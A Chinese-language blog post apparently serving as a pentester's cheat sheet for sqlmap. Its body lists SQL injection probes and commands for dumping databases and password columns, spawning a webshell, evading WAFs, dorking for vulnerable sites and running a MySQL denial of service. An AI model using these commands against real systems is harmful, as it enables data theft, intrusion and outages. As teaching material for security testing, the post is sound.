@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文主要介绍Sqlmap基础使用（摘自网络），一般测试过程查看本文即可。MySQL数据库注入 检查注入点（主要看是否能返回消息）：sqlmap.py -u url 爆所有库：sqlmap.py -u url -dbs 爆当前库：sqlmap.py -u url --current-db Access数据库注入">
+<meta name="keywords" content="sqlmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlmap之基础使用">
+<meta property="og:url" content="https://choge.top/2019/11/26/Sqlmap之基础使用/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文主要介绍Sqlmap基础使用（摘自网络），一般测试过程查看本文即可。MySQL数据库注入 检查注入点（主要看是否能返回消息）：sqlmap.py -u url 爆所有库：sqlmap.py -u url -dbs 爆当前库：sqlmap.py -u url --current-db Access数据库注入">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-03-03T04:18:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqlmap之基础使用">
+<meta name="twitter:description" content="本文主要介绍Sqlmap基础使用（摘自网络），一般测试过程查看本文即可。MySQL数据库注入 检查注入点（主要看是否能返回消息）：sqlmap.py -u url 爆所有库：sqlmap.py -u url -dbs 爆当前库：sqlmap.py -u url --current-db Access数据库注入">
+  <link rel="canonical" href="https://choge.top/2019/11/26/Sqlmap之基础使用/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Sqlmap之基础使用 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2019/11/26/Sqlmap之基础使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Sqlmap之基础使用
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-26 21:25:47" itemprop="dateCreated datePublished" datetime="2019-11-26T21:25:47+08:00">2019-11-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-03 12:18:44" itemprop="dateModified" datetime="2020-03-03T12:18:44+08:00">2020-03-03</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>2.3k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>2 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要介绍Sqlmap基础使用（摘自网络），一般测试过程查看本文即可。</p><h2 id="MySQL数据库注入"><a href="#MySQL数据库注入" class="headerlink" title="MySQL数据库注入"></a>MySQL数据库注入</h2><ul>
+<li>检查注入点（主要看是否能返回消息）：<code>sqlmap.py -u url</code></li>
+<li>爆所有库：<code>sqlmap.py -u url -dbs</code></li>
+<li>爆当前库：<code>sqlmap.py -u url --current-db</code></li>
+</ul><h2 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h2><a id="more"></a>
+
+<ul>
+<li>判断是否是access数据库：<code>url and exists(select id from MSysAccessObjects)</code></li>
+</ul>
+<p>其他数据库判断语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Access: aNd aSc(cHr(97))=97</span><br><span class="line">Access: and exists(select id from MSysAccessObjects)</span><br><span class="line">SQL Server: and exists(select id from sysobjects)</span><br><span class="line">SQL Server: and length(user)&gt;0</span><br><span class="line">MySQL: and length(user())&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>access数据库没有库的概念，直接爆表<code>sqlmap.py -u &quot;url&quot; --tables</code></li>
+<li>爆列，爆字段，可以在日志里找到</li>
+</ul>
+<h2 id="指定数据库，操作系统"><a href="#指定数据库，操作系统" class="headerlink" title="指定数据库，操作系统"></a>指定数据库，操作系统</h2><p>检查是否是注入点</p>
+<ul>
+<li>检查是否是注入点<code>sqlmap.py -u url --dbms mysql 5.0 --current-db</code> </li>
+<li>爆表：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms --tables</code> </li>
+<li>爆列：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_user --columns</code> </li>
+<li>爆字段：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_users -C password ,username --dump</code></li>
+</ul>
+<h2 id="请求延时注入"><a href="#请求延时注入" class="headerlink" title="请求延时注入"></a>请求延时注入</h2><ul>
+<li>测试注入点：<code>sqlmap.py -u url -p id</code></li>
+<li>sqlmap注入方式technique<code>sqlmap.py -u url --technique T</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">B: 基于Boolean的盲注（Boolean based blind）</span><br><span class="line">Q: 内联查询（inlin queries）</span><br><span class="line">T: 基于时间的盲注（time based blind）</span><br><span class="line">U: 联合查询（union query based）</span><br><span class="line">E: 错误（error based）</span><br><span class="line">S: 栈查询（stack queries）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>猜数据库<code>sqlmap.py -u url --technique T -time-sec 9 --current-db</code></li>
+<li>其他参数：<code>--delay</code>，<code>--safe-freq</code></li>
+</ul>
+<h2 id="常见伪静态注入"><a href="#常见伪静态注入" class="headerlink" title="常见伪静态注入"></a>常见伪静态注入</h2><p><strong>伪静态：</strong>主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以并不能防止注入。目前来看，防止注入的最有效的方法就是使用LINQ。</p>
+<ul>
+<li>加星花：<code>sqlmap.py -u &quot;url*.html&quot; --dbs</code> </li>
+<li>利用sqlmap注入：<code>sqlmap.py -u &quot;url*.html&quot; --current-db --hex</code> </li>
+<li>爆表：<code>sqlmap.py -u &quot;url*.html&quot; -D &quot;cms&quot; --tables –hex</code></li>
+</ul>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ul>
+<li>burpsuite获得cookie</li>
+<li>sqlmap的cookie注入攻击：<code>sqlmap.py -u url --cookie “uname=admin&quot; --level 2</code></li>
+<li>爆库，爆表，爆列，爆字段</li>
+</ul>
+<h2 id="POST登录框注入"><a href="#POST登录框注入" class="headerlink" title="POST登录框注入"></a>POST登录框注入</h2><ul>
+<li>burpsuite抓包右键保存到\Python2\sqlmap中</li>
+<li>测试能否注入<code>sqlmap.py -r 1.txt -p user</code>（-r：让sqlmap加载post请求，-p：指定注入用的参数）</li>
+<li>爆库 <code>sqlmap.py -r 1.txt --current-db</code></li>
+<li>自动搜索表单：<code>sqlmap.py -u url --form</code></li>
+<li>指定一个参数：<code>sqlmap.py -u url --data &quot;name=1&amp;pass=1&quot;</code></li>
+</ul>
+<h2 id="交互式写shell及命令执行"><a href="#交互式写shell及命令执行" class="headerlink" title="交互式写shell及命令执行"></a>交互式写shell及命令执行</h2><ul>
+<li>测试注入点：<code>sqlmap.py -u url -p id</code></li>
+<li>利用SQLmap写webshell:<code>sqlmap.py -u url --os-shell</code> 输入脚本语言，输入网站绝对路径</li>
+</ul>
+<h2 id="绕过WAF防火墙"><a href="#绕过WAF防火墙" class="headerlink" title="绕过WAF防火墙"></a>绕过WAF防火墙</h2><ul>
+<li>利用tamper脚本绕过过滤: <code>sqlmap.py -u url --dbs --batch --flush-session --tamper=equaltolike.py,space2comment.py,randomcase.py</code> </li>
+</ul>
+<h2 id="sqlmap模板使用，编写"><a href="#sqlmap模板使用，编写" class="headerlink" title="sqlmap模板使用，编写"></a>sqlmap模板使用，编写</h2><ul>
+<li>尝试注入 and 1=1被拦截</li>
+<li>利用%0a尝试绕过，发现可以</li>
+<li>编写tamper模板，利用sqlmap跑库(c:\python27\sqlmap\tamper)</li>
+<li>利用sqlmap跑库<code>sqlmap.py -u &quot;url&quot; --dbs --batch --tamper=equaltolike.py, space2mssqlhash.py, randomcase.py, space2hassh.py, base64encode.py, charencode.py</code></li>
+</ul>
+<h2 id="利用sqlmap来google搜索"><a href="#利用sqlmap来google搜索" class="headerlink" title="利用sqlmap来google搜索"></a>利用sqlmap来google搜索</h2><ul>
+<li>查找页面：<code>sqlmap.py -g inurl:php?id=</code></li>
+</ul>
+<h2 id="sqlmpa进行Mysql-DOS攻击"><a href="#sqlmpa进行Mysql-DOS攻击" class="headerlink" title="sqlmpa进行Mysql DOS攻击"></a>sqlmpa进行Mysql DOS攻击</h2><ul>
+<li>获得shell：<code>sqlmap.py -u url --sql-shell</code></li>
+<li>进行攻击：<code>select benchmark(9999999999,0*70726f63409284209)</code></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2019/11/26/Sqlmap之基础使用/" title="Sqlmap之基础使用">https://choge.top/2019/11/26/Sqlmap之基础使用/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/20/docker之快速搭建漏洞环境/" rel="next" title="Docker之快速搭建漏洞环境">
+                  <i class="fa fa-chevron-left"></i> Docker之快速搭建漏洞环境
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/11/26/Sqlmap之使用手册/" rel="prev" title="Sqlmap之使用手册（上）">
+                  Sqlmap之使用手册（上） <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL数据库注入"><span class="nav-number">1.</span> <span class="nav-text">MySQL数据库注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Access数据库注入"><span class="nav-number">2.</span> <span class="nav-text">Access数据库注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库，操作系统"><span class="nav-number">3.</span> <span class="nav-text">指定数据库，操作系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求延时注入"><span class="nav-number">4.</span> <span class="nav-text">请求延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见伪静态注入"><span class="nav-number">5.</span> <span class="nav-text">常见伪静态注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie注入"><span class="nav-number">6.</span> <span class="nav-text">cookie注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST登录框注入"><span class="nav-number">7.</span> <span class="nav-text">POST登录框注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#交互式写shell及命令执行"><span class="nav-number">8.</span> <span class="nav-text">交互式写shell及命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过WAF防火墙"><span class="nav-number">9.</span> <span class="nav-text">绕过WAF防火墙</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap模板使用，编写"><span class="nav-number">10.</span> <span class="nav-text">sqlmap模板使用，编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用sqlmap来google搜索"><span class="nav-number">11.</span> <span class="nav-text">利用sqlmap来google搜索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmpa进行Mysql-DOS攻击"><span class="nav-number">12.</span> <span class="nav-text">sqlmpa进行Mysql DOS攻击</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
